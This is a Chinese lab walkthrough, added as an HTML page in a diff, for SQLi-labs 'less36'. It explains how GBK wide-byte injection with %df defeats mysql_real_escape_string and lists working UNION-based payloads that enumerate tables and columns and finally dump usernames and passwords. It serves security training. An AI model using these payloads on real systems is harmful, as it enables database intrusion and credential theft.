@@ -1,0 +1,45 @@
+<hr>
+<h2 id="title-less36url-https-www-yuque-com-u29002979-ep2zrx-akqnsfaraizokiyc"><a href="#title-less36url-https-www-yuque-com-u29002979-ep2zrx-akqnsfaraizokiyc" class="headerlink" title="title: less36url: https://www.yuque.com/u29002979/ep2zrx/akqnsfaraizokiyc"></a>title: less36<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/akqnsfaraizokiyc">https://www.yuque.com/u29002979/ep2zrx/akqnsfaraizokiyc</a></h2><pre><code class="bash">function check_quotes($string)
+{
+    $string= mysql_real_escape_string($string);    
+    return $string;
+}
+
+mysql_query(&quot;SET NAMES gbk&quot;);
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+</code></pre>
+<p>上面的check_quotes()函数是利用了mysql_real_escape_string()函数进行的过滤。<br><strong>mysql_real_escape_string()函数</strong>转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
+<ul>
+<li><strong>\x00</strong></li>
+<li><strong>\n</strong></li>
+<li><strong>\r</strong></li>
+<li><hr>
+</li>
+<li><strong>‘</strong></li>
+<li><strong>“</strong></li>
+<li><strong>\x1a</strong></li>
+</ul>
+<p>通过页面回显发现依旧是<strong>宽字节注入</strong>\ <a name="JU3F6"></a></p>
+<h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?id=1&#39;</code></p>
+<blockquote>
+<p>Hint: The Query String you input is escaped as : 1’<br>The Query String you input in Hex becomes : 315c27<br>十六进制</p>
+</blockquote>
+<p>单引号被转义，利用**%df**突破</p>
+<p><a name="jqyPJ"></a></p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p><a name="izUqu"></a></p>
+<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>?id=1%df&#39; order by 4--+  </code> <a name="B0iQ5"></a></p>
+<h2 id="回显点检查"><a href="#回显点检查" class="headerlink" title="回显点检查"></a>回显点检查</h2><p><code>?id=-1%df&#39; union select 1,2,3--+</code> <a name="kzUVz"></a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要看用户,数据库版本 ,<br><code>?id=1 %df&#39; and 1=2 union select 1,user(),version()--+</code>\ <a name="kzVJM"></a></p>
+<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><pre><code class="bash">爆破数据库名称
+?id=-1%df&#39; union select 1,2,database()--+
+
+爆破数据库表名称
+?id=-1%df&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+
+
+爆破字段名称
+users的16进制是0x7573657273
+?id=-1%df&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
+
+爆破字段内容
+?id=-1%df&#39; union select 1,2,(select group_concat(username,0x7e,password) from users)--+
+</code></pre>
